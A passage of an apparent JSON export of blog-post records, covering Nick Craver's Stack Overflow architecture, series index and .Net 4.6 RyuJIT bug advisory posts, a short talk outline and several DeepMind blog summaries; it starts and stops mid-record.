instances, we also have a machine learning instance slaved across 2 more dedicated servers (due to memory). This is used for recommending questions on the home page, better matching to jobs, etc. It\u2019s a platform called Providence, covered by Kevin Montrose here. The main Redis servers have 256GB of RAM (about 90GB in use) and the Providence servers have 384GB of RAM (about 125GB in use). Redis isn\u2019t just for cache though, it also has a publish & subscriber mechanism where one server can publish a message and all other subscribers receive it\u2014including downstream clients on Redis slaves. We use this mechanism to clear L1 caches on other servers when one web server does a removal for consistency, but there\u2019s another great use: websockets. Websockets (https://github.com/StackExchange/NetGain) We use websockets to push real-time updates to users such as notifications in the top bar, vote counts, new nav counts, new answers and comments, and a few other  bits. The socket servers themselves are using raw sockets running on the web tier. It\u2019s a very thin application on top of our open source library: StackExchange.NetGain. During peak, we have about 500,000 concurrent websocket connections open. That\u2019s a lot of browsers. Fun fact: some of those browsers have been open for over 18 months. We\u2019re not sure why. Someone should go check if those developers are still alive. Here\u2019s what this week\u2019s concurrent websocket pattern looks like:  Why websockets? They\u2019re tremendously more efficient than polling at our scale. We can simply push more data with fewer resources this way, while being more instant to the user. They\u2019re not without issues though\u2014ephemeral port and file handle exhaustion on the load balancer are fun issues we\u2019ll cover later. Search (Elasticsearch) Spoiler: there\u2019s not a lot to get excited about here. The web tier is doing pretty vanilla searches against Elasticsearch 1.4, using the very slim high-performance StackExchange.Elastic client. Unlike most things, we have no plans to open source this simply because it only exposes a very slim subset of the API we use. I strongly believe releasing it would do more harm than good with developer confusion. We\u2019re using elastic for /search, calculating related questions, and suggestions when asking a question. Each Elastic cluster (there\u2019s one in each data center) has 3 nodes, and each site has its own index. Careers has an additional few indexes. What makes our setup a little non-standard in the elastic world: our 3 server clusters are a bit beefier than average with all SSD storage, 192GB of RAM, and dual 10Gbps network each. The same application domains (yeah, we\u2019re screwed with .Net Core here\u2026) in Stack Server that host the tag engine also continually index items in Elasticsearch. We do some simple tricks here such as ROWVERSION in SQL Server (the data source) compared against a \u201clast position\u201d document in Elastic. Since it behaves like a sequence, we can simply grab and index any items that have changed since the last pass. The main reason we\u2019re on Elasticsearch instead of something like SQL full-text search is scalability and better allocation of money. SQL CPUs are comparatively very expensive, Elastic is cheap and has far more features these days. Why not Solr? We want to search across the entire network (many indexes at once), and this wasn\u2019t supported at decision time. The reason we\u2019re not on 2.x yet is a major change to \u201ctypes\u201d means we need to reindex everything to upgrade. I just don\u2019t have enough time to make the needed changes and migration plan yet. Databases (SQL Server) We\u2019re using SQL Server as our single source of truth. All data in Elastic and Redis comes from SQL Server. We run 2 SQL Server clusters with AlwaysOn Availability Groups. Each of these clusters has 1 master (taking almost all of the load) and 1 replica in New York. Additionally, they have 1 replica in Colorado (our DR data center). All replicas are asynchronous. The first cluster is a set of Dell R720xd servers, each with 384GB of RAM, 4TB of PCIe SSD space, and 2x 12 cores. It hosts the Stack Overflow, Sites (bad name, I\u2019ll explain later), PRIZM, and Mobile databases. The second cluster is a set of Dell R730xd servers, each with 768GB of RAM, 6TB of PCIe SSD space, and 2x 8 cores. This cluster runs everything else. That list includes Talent, Open ID, Chat, our Exception log, and every other Q&A site (e.g. Super User, Server Fault, etc.). CPU utilization on the database tier is something we like to keep very low, but it\u2019s actually a little high at the moment due to some plan cache issues we\u2019re addressing. As of right now, NY-SQL02 and 04 are masters, 01 and 03 are replicas we just restarted today during some SSD upgrades. Here\u2019s what the past 24 hours looks like:  Our usage of SQL is pretty simple. Simple is fast. Though some queries can be crazy, our interaction with SQL itself is fairly vanilla. We have some legacy Linq2Sql, but all new development is using Dapper, our open source Micro-ORM using POCOs. Let me put this another way: Stack Overflow has only 1 stored procedure in the database and I intend to move that last vestige into code. Libraries Okay, let\u2019s change gears to something that can more directly help you. I\u2019ve mentioned a few of these up above, but I\u2019ll provide a list here of many open-source .Net libraries we maintain for the world to use. We open sourced them because they have no core business value but can help the world of developers. I hope you find these useful today:  Dapper (.Net Core) - High-performance Micro-ORM for ADO.Net StackExchange.Redis - High-performance Redis client MiniProfiler - Lightweight profiler we run on every page (also supports Ruby, Go, and Node) Exceptional - Error logger for SQL, JSON, MySQL, etc. Jil - High-performance JSON (de)serializer Sigil - A .Net CIL generation helper (for when C# isn\u2019t fast enough) NetGain - High-performance websocket server Opserver - Monitoring dashboard polling most systems directly and feeding from Orion, Bosun, or WMI as well. Bosun - Backend monitoring system, written in Go  Next up is a detailed current hardware list of what runs our code. After that, we go down the list. Stay tuned.", "content": "", "cover_photo_url": "https://nickcraver.com/blog/content/SO-Architecture/SO-Architecture-RackB-Bottom.jpg", "profile": 2, "updated_on": "2016-02-17T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7147.8387411, "slug": "stack-overflow-the-architecture-2016-edition-148", "topics": [61]}}, {"model": "app.post", "pk": 149, "fields": {"title": "Stack Overflow: A Technical Deconstruction", "link": "https://nickcraver.com/blog/2016/02/03/stack-overflow-a-technical-deconstruction/", "source": 1, "normalized_link": "nickcraver.com/blog/2016/02/03/stack-overflow-a-technical-deconstruction", "summary": " As new posts in the series appear, I\u2019ll add them here to serve as a master list: #1: Stack Overflow: The Architecture - 2016 Edition #2: Stack Overflow: The Hardware - 2016 Edition #3: Stack Overflow: How We Do Deployment - 2016 Edition #4: Stack Overflow: How We Do Monitoring - 2018 Edition #5: Stack Overflow: How We Do App Caching - 2019 Edition  One of the reasons I love working at Stack Overflow is we\u2019re allowed encouraged to talk about almost anything out in the open. Except for things companies always keep private like financials and the nuclear launch codes, everything else is fair game. That\u2019s an awesome thing that we haven\u2019t taken advantage of on the technical side lately. I think it\u2019s time for an experiment in extreme openness. By sharing what we do (and I mean all of us), we better our world. Everyone that works at Stack shares at least one passion: improving life for all developers. Sharing how we do things is one of the best and biggest ways we can do that. It helps you. It helps me. It helps all of us. When I tell you how we do <something>, a few things happen:  You might learn something cool you didn\u2019t know about. We might learn we\u2019re doing it wrong. We\u2019ll both find a better way, together\u2026and we share that too. It helps eliminate the perception that \u201cthe big boys\u201d always do it right. No, we screw up too.  There\u2019s nothing to lose here and there\u2019s no reason to keep things to yourself unless you\u2019re afraid of being wrong. Good news: that\u2019s not a problem. We get it wrong all the time anyway, so I\u2019m not really worried about that one. Failure is always an option. The best any of us can do is live, learn, move on, and do it better next time.  Here\u2019s where I need your help I need you to tell me: what do you want to hear about? My intention is to get to a great many things, but it will take some time. What are people most interested in? How do I decide which topic to blog about next? The answer: I don\u2019t know and I can\u2019t decide. That\u2019s where you come in. Please, tell me. I put together this Trello board: Blog post queue for Stack Overflow topics I\u2019m also embedding it here for ease, hopefully this adds a lot of concreteness to the adventure:  It\u2019s public. You can comment and vote on topics as well as suggest new topics either on the board itself or shoot me a tweet: @Nick_Craver. Please, help me out by simply voting for what you want to know so I can prioritize the queue. If you see a topic and have specific questions, please comment on the card so I make sure to answer it in the post. The first post won\u2019t be vote-driven. I think it has to be the architecture overview so all future references make sense. After that, I\u2019ll go down the board and blog the highest-voted topic each time. I\u2019ve missed blogging due to spending my nights entirely in open source lately. I don\u2019t believe that\u2019s necessarily the best or only way for me to help developers. Having votes for topics gives me real motivation to dedicate the time to writing them up, pulling the stats, and making the pretty pictures. For that, I thank everyone participating. If you\u2019re curious about my writing style and what to expect, check out some of my previous posts:  How we upgrade a live data center What it takes to run Stack Overflow Stackoverflow.com: the road to SSL  Am I crazy? Yep, probably - that\u2019s already a lot of topics. But I think it\u2019ll be fun and engaging. Let\u2019s go on this adventure together.", "content": "", "cover_photo_url": null, "profile": 2, "updated_on": "2016-02-03T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7120.9587411, "slug": "stack-overflow-a-technical-deconstruction-149", "topics": [61]}}, {"model": "app.post", "pk": 150, "fields": {"title": "Why you should wait on upgrading to .Net 4.6", "link": "https://nickcraver.com/blog/2015/07/27/why-you-should-wait-on-dotnet-46/", "source": 1, "normalized_link": "nickcraver.com/blog/2015/07/27/why-you-should-wait-on-dotnet-46", "summary": "Update (August 11th): A patch for this bug has been released by Microsoft. Here\u2019s their update to the advisory:  We released an updated version of RyuJIT today, which resolves this advisory. The update was released as Microsoft Security Bulletin MS15-092 and is available on Windows Update or via direct download as KB3086251. The update resolves: CoreCLR #1296, CoreCLR #1299, and VisualFSharp #536. Major thanks to the developers who reported these issues. Thanks to everyone for their patience.  Original Post What follows is the work of several people: Marc Gravell and I have taken lead on this at Stack Overflow and we continue to coordinate with Microsoft on a resolution. They have fixed the bug internally, but not for users. Given the severity, we can\u2019t in good conscience let such a subtle yet high-impact bug linger silently. We are not upgrading Stack Overflow to .Net 4.6, and you shouldn\u2019t upgrade yet either. You can find the issue we opened on GitHub (for public awareness) here. A fix has been released, see Update 5 below. Update #1 (July 27th): A pull request has been posted by Matt Michell (Microsoft). Update #2 (July 28th): There are several smaller repros now (including a small console app). Microsoft has confirmed they are working on an expedited hotfix release but we don\u2019t have details yet. Update #3 (July 28th): Microsoft\u2019s Rich Lander has posted an update: RyuJIT Bug Advisory in the .NET Framework 4.6. Update #4 (July 29th): There\u2019s another subtle bug found by Andrey Akinshin and the F# Engine Exception is confirmed to be a separate issue. I still recommend disabling RyuJIT in production given the increasing bug count. Update #5 (August 11th): A patch for this bug has been released by Microsoft, see above. This critical bug is specific to .Net 4.6 and RyuJIT (64-bit). I\u2019ll make this big and bold so we get to the point quickly: The methods you call can get different parameter values than you passed in.  The JIT (Just-in-Time compiler) in .Net (and many platforms) does something called Tail Call optimization. This happens to alleviate stack load on the last-called method in a chain. I won\u2019t go into what a tail call is because there\u2019s already an excellent write up by David Broman. The issue here is a bug in how RyuJIT x64 implements this optimization in certain situations. Let\u2019s look at the specific example we hit at Stack Overflow (we have uploaded a minimal version of this reproduction to GitHub). We noticed that MiniProfiler (which we use to track performance) was showing only on the first page load. The profiler then failed to show again until an application recycle. This turned out to be a caching bug based on the HTTP Cache usage locally. HTTP Cache is our \u201cL1\u201d cache at Stack Overflow; redis is typically the \u201cL2.\u201d After over a day of debugging (and sanity checking), we tracked the crazy to here:  void Set<T>(string key, T val, int? durationSecs, bool sliding, bool broadcastRemoveFromCache = false) {     SetWithPriority<T>(key, val, durationSecs, sliding, CacheItemPriority.Default); }  void SetWithPriority<T>(string key, T val, int? durationSecs, bool isSliding, CacheItemPriority priority) {     key = KeyInContext(key);      RawSet(key, val, durationSecs, isSliding, priority); }  void RawSet(string cacheKey, object val, int? durationSecs, bool isSliding, CacheItemPriority priority) {     var absolute = !isSliding && durationSecs.HasValue                     ? DateTime.UtcNow.AddSeconds(durationSecs.Value)                     : Cache.NoAbsoluteExpiration;     var sliding = isSliding && durationSecs.HasValue                    ? TimeSpan.FromSeconds(durationSecs.Value)                    : Cache.NoSlidingExpiration;      HttpRuntime.Cache.Insert(cacheKey, val, null, absolute, sliding, priority, null); }  What was happening? We were setting the MiniProfiler cache duration (passed to Set<T>) as 3600 seconds. But often (~98% of the time), we were seeing it immediately expire from HTTP cache. Next we narrowed this down to being a bug only when optimizations are enabled (the \u201cOptimize Code\u201d checkbox on your project\u2019s build properties). At this point sanity is out the window and you debug everything. Here\u2019s what that code looks like now. Note: I have slightly shortened it to fit this page. The unaltered code is on GitHub here.  void Set<T>(string key, T val, int? durationSecs, bool sliding, bool broadcastRemoveFromCache = false) {     LocalCache.OnLogDuration(key, durationSecs, \"LocalCache.Set\");     SetWithPriority<T>(key, val, durationSecs, sliding, CacheItemPriority.Default); }  void SetWithPriority<T>(string key, T val, int? durationSecs, bool isSliding, CacheItemPriority priority) {     LocalCache.OnLogDuration(key, durationSecs, \"LocalCache.SetWithPriority\");     key = KeyInContext(key);      RawSet(key, val, durationSecs, isSliding, priority); }  void RawSet(string cacheKey, object value, int? durationSecs, bool isSliding, CacheItemPriority priority) {     LocalCache.OnLogDuration(cacheKey, durationSecs, \"RawSet\");     var absolute = !isSliding && durationSecs.HasValue                     ? DateTime.UtcNow.AddSeconds(durationSecs.Value)                     : Cache.NoAbsoluteExpiration;     var sliding = isSliding && durationSecs.HasValue                    ? TimeSpan.FromSeconds(durationSecs.Value)                    : Cache.NoSlidingExpiration;      HttpRuntime.Cache.Insert(cacheKey, value, null, absolute, sliding, priority, Removed);     var evt = Added;     if(evt != null) evt(cacheKey, value, absolute, sliding, priority, durationSecs, isSliding); }  This is nothing fancy, all we have is some methods calling each other. Here\u2019s the scary result of those LocalCache.OnLogDuration calls:  LocalCache.Set: 3600 LocalCache.SetWithPriority: 3600 RawSet: null, or 114, or 97, or some other seemingly random value  Here\u2019s an example test run from the GitHub repo:   The method we called did not get the parameters we passed. That\u2019s it. The net result of this is that local cache (which we use very heavily) is either unreliable or non-existent. This would add a tremendous amount of load to our entire infrastructure, making Stack Overflow much slower and likely leading to a full outage. That\u2019s not why we\u2019re telling you about this though. Let\u2019s step back and look at the big picture. What are some other variable names we could use?  amountToWithdraw qtyOfStockToBuy carbonCopyToAccountId voltage targetAltitude rotorVelocity oxygenPressure dosageMilliliters  Does that help put things in perspective? This bug is not obvious for several reasons:  It only happens with optimizations enabled. For most developers and projects, that\u2019s not in DEBUG and won\u2019t show locally.      That means you\u2019ll only see this in RELEASE, which for most people is only production.   Attaching a debugger alters the behavior. This almost always hides the issue. Adding a Debug.WriteLine() will often fix the issue because of the tail change. It won\u2019t reproduce in certain scenarios (e.g. we can\u2019t repro this in a console application or VS hosting, only IIS). Given the nature of the bug, as far as we can tell, it can equally affect any framework library as well. It can happen in a NuGet library (most of which are RELEASE); the issue may not be in your code at all.  To address an obvious question: is this a security issue? Answer: it can be. It\u2019s not something you could actively exploit in almost all cases, since stack variables are the things being swapped around here. However, it can be an issue indirectly. For example, if your code makes an assumption with a null param like if (user == null) { user = SystemUser; }, then a null passed in will certainly be a problem, giving other users that access sporadically. A more common example of this would be a value for a Role enum being passed incorrectly. Recommendations  Do not install .Net 4.6 in production. If you have installed .Net 4.6, disable RyuJIT immediately (this is a temporary fix and should be removed when an update is released). You can disable RyuJIT via a registry setting (note: this requires an application pool recycle to take effect).      Under HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework add a useLegacyJit DWORD with a value of 1 Or via PowerShell:     Set-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name useLegacyJit -Type DWord -Value 1  Be aware, the web.config method (#3) of disabling RyuJIT does not work. Outside of IIS hosting, applying this fix via app.config does work. We are talking with and pushing Microsoft to get a fix for this shipped ASAP. We recognize releasing a fix for .Net on the Microsoft side isn\u2019t a small deal. Our disclosure is prompted by the reality that a fix cannot be released, distributed, and applied immediately.", "content": "", "cover_photo_url": null, "profile": 2, "updated_on": "2015-07-27T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6754.2387411, "slug": "why-you-should-wait-on-upgrading-to-net-46-150", "topics": [61]}}, {"model": "app.post", "pk": 151, "fields": {"title": "(tiny) Life At Stack Overflow: My Developers Are Smarter Than Your DBAs", "link": "https://nickcraver.com/talks/tiny/developers-and-dbas", "source": 1, "normalized_link": "nickcraver.com/talks/tiny/developers-and-dbas", "summary": " My Developers Are Smarter Than Your DBAs                             by @Nick_Craver    What would you say...you do here? Last month at Stack Overflow:  1,468,389,303 Page Views 5,183,954,727 HTTP Hits 71,562,833,811,315 Bytes Sent 3,202,505,376 CDN Hits 54,400,000,000,000 CDN Bytes 19,532,899,854 SQL Queries 81,505,688,410 Redis Ops 18.2ms Average Render Time ...at roughly 5-10% capacity     How do we do that?   Go that way, really fast. If something gets in your way...turn.   We're not ready to turn yet.     Being part of a team   Disadvantages: You no longer know all the things You don't have time to learn all the things Merge conflicts   Advantages: You have help Lots of help More victims for the wheel of blame     Pipelines   Most interactions with a DBA require 2 people This is true of anyone you're asking for a service     Perspective & Scope   We know the things we know Except knowing what we know   Insight and decisions are based on our world Specifically, the world as we see it   Fog of war        What does this allow us to do? Tag Engine Elasticsearch Moving /users into redis Anything we want    Q&A? We love Q&A. ", "content": "", "cover_photo_url": null, "profile": 2, "updated_on": "2015-07-24T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6748.4787411, "slug": "tiny-life-at-stack-overflow-my-developers-are-smarter-than-your-dbas-151", "topics": [62]}}, {"model": "app.post", "pk": 152, "fields": {"title": "RT-2: New model translates vision and language into action", "link": "https://www.deepmind.com/blog/rt-2-new-model-translates-vision-and-language-into-action", "source": 1, "normalized_link": "www.deepmind.com/blog/rt-2-new-model-translates-vision-and-language-into-action", "summary": "Introducing Robotic Transformer 2 (RT-2), a novel vision-language-action (VLA) model that learns from both web and robotics data, and translates this knowledge into generalised instructions for robotic control, while retaining web-scale capabilities. This work builds upon Robotic Transformer 1 (RT-1), a model trained on multi-task demonstrations which can learn combinations of tasks and objects seen in the robotic data. RT-2 shows improved generalisation capabilities and semantic and visual understanding, beyond the robotic data it was exposed to. This includes interpreting new commands and responding to user commands by performing rudimentary reasoning, such as reasoning about object categories or high-level descriptions.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/64c28b81ad5efcad99aca86f_rt2_header-min.png", "profile": 8, "updated_on": "2023-07-28T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12366.3987411, "slug": "rt-2-new-model-translates-vision-and-language-into-action-152", "topics": []}}, {"model": "app.post", "pk": 153, "fields": {"title": "Using AI to fight climate change", "link": "https://www.deepmind.com/blog/using-ai-to-fight-climate-change", "source": 1, "normalized_link": "www.deepmind.com/blog/using-ai-to-fight-climate-change", "summary": "AI is a powerful technology that will transform our future, so how can we best apply it to help combat climate change and find sustainable solutions? The effects of climate change on Earth\u2019s ecosystems are incredibly complex, and as part of our effort to use AI for solving some of the world\u2019s most challenging problems, here are some of the ways we\u2019re working to advance our understanding, optimise existing systems, and accelerate breakthrough science of climate and its effects.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/64b673590474016a2e1ac5a9_Nidia_Dias__Sustainability_04%20(2).jpg", "profile": 8, "updated_on": "2023-07-21T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12352.9587411, "slug": "using-ai-to-fight-climate-change-153", "topics": []}}, {"model": "app.post", "pk": 154, "fields": {"title": "Google DeepMind\u2019s latest research at ICML 2023", "link": "https://www.deepmind.com/blog/google-deepmind-research-at-icml-2023", "source": 1, "normalized_link": "www.deepmind.com/blog/google-deepmind-research-at-icml-2023", "summary": "Google DeepMind researchers are presenting more than 80 new papers at the 40th International Conference on Machine Learning (ICML 2023), taking place 23-29 July in Honolulu, Hawai'i.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/64b9206886b6ef1228c7ac2f_google-deepmind-Vc0CmuIfMg0-unsplash.webp", "profile": 8, "updated_on": "2023-07-20T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12351.0387411, "slug": "google-deepminds-latest-research-at-icml-2023-154", "topics": []}}, {"model": "app.post", "pk": 155, "fields": {"title": "Developing reliable AI tools for healthcare", "link": "https://www.deepmind.com/blog/codoc-developing-reliable-ai-tools-for-healthcare", "source": 1, "normalized_link": "www.deepmind.com/blog/codoc-developing-reliable-ai-tools-for-healthcare", "summary": "We\u2019ve published our joint paper with Google Research in Nature Medicine, which proposes CoDoC (Complementarity-driven Deferral-to-Clinical Workflow), an AI system that learns when to rely on predictive AI tools or defer to a clinician for the most accurate interpretation of medical images.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/64c7c11a43c98bb728c272db_header.webp", "profile": 8, "updated_on": "2023-07-17T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12345.2787411, "slug": "developing-reliable-ai-tools-for-healthcare-155", "topics": []}}, {"model": "app.post", "pk": 156, "fields": {"title": "Exploring institutions for global AI governance", "link": "https://www.deepmind.com/blog/exploring-institutions-for-global-ai-governance", "source": 1, "normalized_link": "www.deepmind.com/blog/exploring-institutions-for-global-ai-governance", "summary": "New white paper investigates models and functions of international institutions that could help manage opportunities and mitigate risks of advanced AI. Growing awareness of the global impact of advanced artificial intelligence (AI) has inspired public discussions about the need for international governance structures to help manage opportunities and mitigate risks involved. Many discussions have drawn on analogies with the ICAO (International Civil Aviation Organization) in civil aviation; CERN (European Organization for Nuclear Research) in particle physics; IAEA (International Atomic Energy Agency) in nuclear technology, and intergovernmental and multi-stakeholder organisations in many other domains. And yet, while analogies can be a useful start, the technologies emerging from AI will be unlike aviation, particle physics, or nuclear technology. To succeed with AI governance, we need to better understand: what specific benefits and risks we need to manage internationally, what governance functions those benefits and risks require, what organisations can best provide those functions.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/64abdcd29c793735754416fc_Champ_Panupong_Techawongthawon__Accountability_01.jpg", "profile": 8, "updated_on": "2023-07-11T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12333.7587411, "slug": "exploring-institutions-for-global-ai-governance-156", "topics": []}}, {"model": "app.post", "pk": 157, "fields": {"title": "RoboCat: A self-improving robotic agent", "link": "https://www.deepmind.com/blog/robocat-a-self-improving-robotic-agent", "source": 1, "normalized_link": "www.deepmind.com/blog/robocat-a-self-improving-robotic-agent", "summary": "Robots are quickly becoming part of our everyday lives, but they\u2019re often only programmed to perform specific tasks well. While harnessing recent advances in AI could lead to robots that could help in many more ways, progress in building general-purpose robots is slower in part because of the time needed to collect real-world training data.\u00a0Our latest paper introduces a self-improving AI agent for robotics, RoboCat, that learns to perform a variety of tasks across different arms, and then self-generates new training data to improve its technique.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6491af31af4e56ab852adc12_robocat.webp", "profile": 8, "updated_on": "2023-06-20T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12293.4387411, "slug": "robocat-a-self-improving-robotic-agent-157", "topics": []}}, {"model": "app.post", "pk": 158, "fields": {"title": "Optimising computer systems with more generalised AI tools", "link": "https://www.deepmind.com/blog/optimising-computer-systems-with-more-generalised-ai-tools", "source": 1, "normalized_link": "www.deepmind.com/blog/optimising-computer-systems-with-more-generalised-ai-tools", "summary": "Based on reinforcement learning, our AI models AlphaZero and MuZero have achieved superhuman performance winning games. Now, they\u2019re expanding their capabilities to help optimise resources in data centres and advance video compression \u2013 and most recently, our specialised version of AlphaZero, called AlphaDev, discovered new algorithms that are already accelerating the software applications at the foundations of our digital society.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/64807bf25294d9863578ef5a_DM_Hero1.png", "profile": 8, "updated_on": "2023-06-07T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12268.4787411, "slug": "optimising-computer-systems-with-more-generalised-ai-tools-158", "topics": []}}, {"model": "app.post", "pk": 159, "fields": {"title": "AlphaDev discovers faster sorting algorithms", "link": "https://www.deepmind.com/blog/alphadev-discovers-faster-sorting-algorithms", "source": 1, "normalized_link": "www.deepmind.com/blog/alphadev-discovers-faster-sorting-algorithms", "summary": "In our paper published today in Nature, we introduce AlphaDev, an artificial intelligence (AI) system that uses reinforcement learning to discover enhanced computer science algorithms \u2013 surpassing those honed by scientists and engineers over decades.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/64807d68d425bdd22cc43233_Copy%20of%20alphadev_01_06_crops_crop5_0114%20(1).png", "profile": 8, "updated_on": "2023-06-07T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12268.4787411, "slug": "alphadev-discovers-faster-sorting-algorithms-159", "topics": []}}, {"model": "app.post", "pk": 160, "fields": {"title": "An early warning system for novel AI risks", "link": "https://www.deepmind.com/blog/an-early-warning-system-for-novel-ai-risks", "source": 1, "normalized_link": "www.deepmind.com/blog/an-early-warning-system-for-novel-ai-risks", "summary": "AI researchers already use a range of evaluation benchmarks to identify unwanted behaviours in AI systems, such as AI systems making misleading statements, biased decisions, or repeating copyrighted content. Now, as the AI community builds and deploys increasingly powerful AI, we must expand the evaluation portfolio to include the possibility of extreme risks from general-purpose AI models that have strong skills in manipulation, deception, cyber-offense, or other dangerous capabilities.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/646f6e9992ceb1a002f3c316_16x9-min.jpg", "profile": 8, "updated_on": "2023-05-25T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12243.5187411, "slug": "an-early-warning-system-for-novel-ai-risks-160", "topics": []}}, {"model": "app.post", "pk": 161, "fields": {"title": "DeepMind\u2019s latest research at ICLR 2023", "link": "https://www.deepmind.com/blog/deepminds-latest-research-at-iclr-2023", "source": 1, "normalized_link": "www.deepmind.com/blog/deepminds-latest-research-at-iclr-2023", "summary": "Next week marks the start of the 11th International Conference on Learning Representations (ICLR), taking place 1-5 May in Kigali, Rwanda. This will be the first major artificial intelligence (AI) conference to be hosted in Africa and the first in-person event since the start of the pandemic. Researchers from around the world will gather to share their cutting-edge work in deep learning spanning the fields of AI, statistics and data science, and applications including machine vision, gaming and robotics. We\u2019re proud to support the conference as a Diamond sponsor and DEI champion.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/644a5309537e5d50d2de4a5e_deepmind-lISkvdgfLEk%20(1).jpg", "profile": 8, "updated_on": "2023-04-27T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12189.7587411, "slug": "deepminds-latest-research-at-iclr-2023-161", "topics": []}}, {"model": "app.post", "pk": 162, "fields": {"title": "How can we build human values into AI?", "link": "https://www.deepmind.com/blog/how-can-we-build-human-values-into-ai", "source": 1, "normalized_link": "www.deepmind.com/blog/how-can-we-build-human-values-into-ai", "summary": "As artificial intelligence (AI) becomes more powerful and more deeply integrated into our lives, the questions of how it is used and deployed are all the more important. What values guide AI? Whose values are they? And how are they selected?", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6446a131f40d85e2e2c84a47_Header_VOI.jpg", "profile": 8, "updated_on": "2023-04-24T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12183.9987411, "slug": "how-can-we-build-human-values-into-ai-162", "topics": []}}, {"model": "app.post", "pk": 163, "fields": {"title": "Announcing Google DeepMind", "link": "https://www.deepmind.com/blog/announcing-google-deepmind", "source": 1, "normalized_link": "www.deepmind.com/blog/announcing-google-deepmind", "summary": "DeepMind and the Brain team from Google Research will join forces to accelerate progress towards a world in which AI helps solve the biggest challenges facing humanity.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/64410a99d52cf88103c4b88c_GDM_16_9.jpg", "profile": 8, "updated_on": "2023-04-20T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12176.3187411, "slug": "announcing-google-deepmind-163", "topics": []}}, {"model": "app.post", "pk": 164, "fields": {"title": "Competitive programming with AlphaCode", "link": "https://www.deepmind.com/blog/competitive-programming-with-alphacode", "source": 1, "normalized_link": "www.deepmind.com/blog/competitive-programming-with-alphacode", "summary": "Solving novel problems and setting a new milestone in competitive programming.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6221e6c759f19819bd5bec04_CodeGen.jpg", "profile": 8, "updated_on": "2022-12-08T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11920.9587411, "slug": "competitive-programming-with-alphacode-164", "topics": []}}, {"model": "app.post", "pk": 165, "fields": {"title": "AI for the board game Diplomacy", "link": "https://www.deepmind.com/blog/ai-for-the-board-game-diplomacy", "source": 1, "normalized_link": "www.deepmind.com/blog/ai-for-the-board-game-diplomacy", "summary": "Successful communication and cooperation have been crucial for helping societies advance throughout history. The closed environments of board games can serve as a sandbox for modelling and investigating interaction and communication \u2013 and we can learn a lot from playing them. In our recent paper, published today in Nature Communications, we show how artificial agents can use communication to better cooperate in the board game Diplomacy, a vibrant domain in artificial intelligence (AI) research, known for its focus on alliance building.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-12-06T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11917.1187411, "slug": "ai-for-the-board-game-diplomacy-165", "topics": []}}, {"model": "app.post", "pk": 166, "fields": {"title": "Mastering Stratego, the classic game of imperfect information", "link": "https://www.deepmind.com/blog/mastering-stratego-the-classic-game-of-imperfect-information", "source": 1, "normalized_link": "www.deepmind.com/blog/mastering-stratego-the-classic-game-of-imperfect-information", "summary": "Game-playing artificial intelligence (AI) systems have advanced to a new frontier. Stratego, the classic board game that\u2019s more complex than chess and Go, and craftier than poker, has now been mastered. Published in Science, we present DeepNash, an AI agent that learned the game from scratch to a human expert level by playing against itself.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6388ce129963208649083b0e_Stratego_header_02_hd.png", "profile": 8, "updated_on": "2022-12-01T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11907.5187411, "slug": "mastering-stratego-the-classic-game-of-imperfect-information-166", "topics": []}}, {"model": "app.post", "pk": 167, "fields": {"title": "DeepMind\u2019s latest research at NeurIPS 2022", "link": "https://www.deepmind.com/blog/deepminds-latest-research-at-neurips-2022", "source": 1, "normalized_link": "www.deepmind.com/blog/deepminds-latest-research-at-neurips-2022", "summary": "NeurIPS is the world\u2019s largest conference in artificial intelligence 